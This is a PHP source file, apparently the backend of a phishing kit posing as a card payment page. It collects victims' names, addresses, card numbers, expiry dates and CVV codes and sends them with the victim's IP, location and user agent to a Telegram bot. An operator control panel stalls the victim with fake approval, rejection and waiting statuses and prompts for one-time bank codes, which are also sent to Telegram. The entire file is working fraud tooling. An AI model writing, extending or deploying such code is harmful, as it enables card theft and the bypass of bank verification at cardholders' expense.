<?php
session_start();
require_once 'bots.php';
require_once 'functions.php';

header('Content-Type: application/json');

// تسجيل الأخطاء
error_reporting(E_ALL);
ini_set('display_errors', 1);

// تنظيف المعاملات القديمة
cleanupOldTransactions();

// استلام البيانات
$data = json_decode(file_get_contents('php://input'), true);
$response = [
    'success' => false,
    'message' => '',
    'redirect' => '',
    'status' => 'pending'
];

if (!$data) {
    $response['message'] = 'Données invalides';
    echo json_encode($response);
    exit;
}

$sessionId = $data['session_id'] ?? null;
$action = $data['action'] ?? '';

if (!$sessionId) {
    $response['message'] = 'Session ID manquant';
    echo json_encode($response);
    exit;
}

// إذا كان هذا إرسال أولي للنموذج (بدون action)
if (!$action && isset($data['prenom'])) {
    // إضافة الحالة إلى البيانات
    $data['status'] = 'pending';
    
    // حفظ بيانات النموذج في ملف JSON
    if (!saveTransactionData($sessionId, $data)) {
        $response['message'] = 'Erreur lors de la sauvegarde des données';
        echo json_encode($response);
        exit;
    }
    
    // إرسال بيانات النموذج إلى Telegram
    $userIP = getUserIP();
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $country = getCountryFromIP($userIP);
    
    $message = "💳 Nouvelle transaction reçue\n";
    $message .= "🆔 Session ID: {$sessionId}\n\n";
    $message .= "👤 Informations client:\n";
    $message .= "Nom: {$data['prenom']} {$data['nom']}\n";
    $message .= "🏠 Pays: {$data['pays']}\n";
    $message .= "📍 Adresse: {$data['adresse']}\n";
    $message .= "📮 Code postal: {$data['code_postal']}\n";
    $message .= "🏙️ Ville: {$data['ville']}\n\n";
    $message .= "💳 Informations carte:\n";
    $message .= "Numéro: {$data['numero_carte']}\n";
    $message .= "📅 Expiration: {$data['mois_expiration']}/{$data['annee_expiration']}\n";
    $message .= "🔐 CVC: {$data['cvv']}\n\n";
    $message .= "🌐 Informations réseau:\n";
    $message .= "📡 IP: {$userIP}\n";
    $message .= "🗺️ Localisation: {$country}\n";
    $message .= "💻 User Agent: " . substr($userAgent, 0, 50) . "...\n";
    $message .= "⏰ Heure: " . date('Y-m-d H:i:s') . "\n\n";
    $message .= "🔗 Control Panel:\n" . (isset($_SERVER['HTTPS']) ? 'https' : 'http') . "://{$_SERVER['HTTP_HOST']}" . dirname($_SERVER['PHP_SELF']) . "/control_panel.php?session={$sessionId}";
    
    if (sendTelegramMessage($message)) {
        $response = [
            'success' => true,
            'message' => 'Données envoyées avec succès',
            'session_id' => $sessionId,
            'status' => 'pending'
        ];
    }
    
    echo json_encode($response);
    exit;
}

// التحقق من وجود بيانات المعاملة
$transactionData = getTransactionData($sessionId);
if (!$transactionData) {
    $response['message'] = 'Session invalide ou expirée';
    $response['status'] = 'error';
    echo json_encode($response);
    exit;
}

switch ($action) {
    case 'approve_transaction':
        // تحديث حالة المعاملة
        updateTransactionStatus($sessionId, 'approved');
        
        $message = "✅ Transaction approuvée\n";
        $message .= "🆔 Session ID: {$sessionId}\n";
        $message .= "👤 Client: {$transactionData['prenom']} {$transactionData['nom']}\n";
        $message .= "📡 IP: " . ($transactionData['ip_address'] ?? 'Unknown') . "\n";
        $message .= "⏰ " . date('Y-m-d H:i:s') . "\n";
        
        if (sendTelegramMessage($message)) {
            $response = [
                'success' => true,
                'message' => 'Transaction approuvée avec succès',
                'redirect' => 'success.php?session=' . $sessionId,
                'status' => 'approved'
            ];
        }
        break;

    case 'reject_transaction':
        // تحديث حالة المعاملة
        updateTransactionStatus($sessionId, 'rejected');
        
        $message = "❌ Transaction rejetée\n";
        $message .= "🆔 Session ID: {$sessionId}\n";
        $message .= "👤 Client: {$transactionData['prenom']} {$transactionData['nom']}\n";
        $message .= "📡 IP: " . ($transactionData['ip_address'] ?? 'Unknown') . "\n";
        $message .= "⏰ " . date('Y-m-d H:i:s') . "\n";
        
        if (sendTelegramMessage($message)) {
            $response = [
                'success' => true,
                'message' => 'Transaction rejetée',
                'redirect' => 'error.php?session=' . $sessionId,
                'status' => 'rejected'
            ];
        }
        break;

    case 'request_otp':
        // تحديث حالة المعاملة
        updateTransactionStatus($sessionId, 'otp_required');
        
        $message = "📱 Demande de code OTP envoyée\n";
        $message .= "🆔 Session ID: {$sessionId}\n";
        $message .= "👤 Client: {$transactionData['prenom']} {$transactionData['nom']}\n";
        $message .= "📡 IP: " . ($transactionData['ip_address'] ?? 'Unknown') . "\n";
        
        if (sendTelegramMessage($message)) {
            $response = [
                'success' => true,
                'message' => 'Demande OTP envoyée',
                'action' => 'show_otp_input',
                'status' => 'otp_required'
            ];
        }
        break;

    case 'wait_transaction':
        // تحديث حالة المعاملة
        updateTransactionStatus($sessionId, 'waiting');
        
        $message = "⏱️ Transaction mise en attente\n";
        $message .= "🆔 Session ID: {$sessionId}\n";
        $message .= "👤 Client: {$transactionData['prenom']} {$transactionData['nom']}\n";
        $message .= "📊 Statut: En attente de validation\n";
        
        if (sendTelegramMessage($message)) {
            $response = [
                'success' => true,
                'message' => 'Transaction mise en attente',
                'status' => 'waiting'
            ];
        }
        break;

    case 'otp_incorrect':
        // تحديث حالة المعاملة
        updateTransactionStatus($sessionId, 'otp_incorrect');
        
        $message = "❌ Code OTP incorrect\n";
        $message .= "🆔 Session ID: {$sessionId}\n";
        $message .= "👤 Client: {$transactionData['prenom']} {$transactionData['nom']}\n";
        $message .= "📊 Statut: Code OTP incorrect - Nouvelle tentative requise\n";
        
        if (sendTelegramMessage($message)) {
            $response = [
                'success' => true,
                'message' => 'Code OTP marqué comme incorrect',
                'status' => 'otp_incorrect'
            ];
        }
        break;

    case 'verify_otp':
        $otpCode = $data['otp_code'] ?? '';
        
        $message = "🔐 Vérification du code OTP\n";
        $message .= "🆔 Session ID: {$sessionId}\n";
        $message .= "👤 Client: {$transactionData['prenom']} {$transactionData['nom']}\n";
        $message .= "📟 Code: {$otpCode}\n";
        $message .= "📡 IP: " . ($transactionData['ip_address'] ?? 'Unknown') . "\n";
        $message .= "⏰ " . date('Y-m-d H:i:s') . "\n";
        
        if (sendTelegramMessage($message)) {
            // حفظ رمز OTP للتحقق منه لاحقاً
            $transactionData['otp_code'] = $otpCode;
            $transactionData['status'] = 'otp_verification';
            saveTransactionData($sessionId, $transactionData);
            
            $response = [
                'success' => true,
                'message' => 'Code OTP reçu',
                'status' => 'otp_verification'
            ];
        }
        break;

    case 'check_status':
        // التحقق من حالة المعاملة
        $currentData = getTransactionData($sessionId);
        $status = $currentData['status'] ?? 'pending';
        
        $response = [
            'success' => true,
            'status' => $status,
            'message' => getStatusMessage($status)
        ];
        break;

    default:
        $response['message'] = 'Action non valide';
        $response['status'] = 'error';
        break;
}



function getStatusMessage($status) {
    switch ($status) {
        case 'approved':
            return 'Transaction approuvée';
        case 'rejected':
            return 'Transaction rejetée';
        case 'otp_required':
            return 'Vérification OTP requise';
        case 'otp_verification':
            return 'Code OTP en cours de vérification';
        case 'otp_incorrect':
            return 'Code OTP incorrect';
        case 'waiting':
            return 'Transaction en attente';
        case 'pending':
            return 'Transaction en cours de traitement';
        default:
            return 'Statut inconnu';
    }
}

echo json_encode($response);
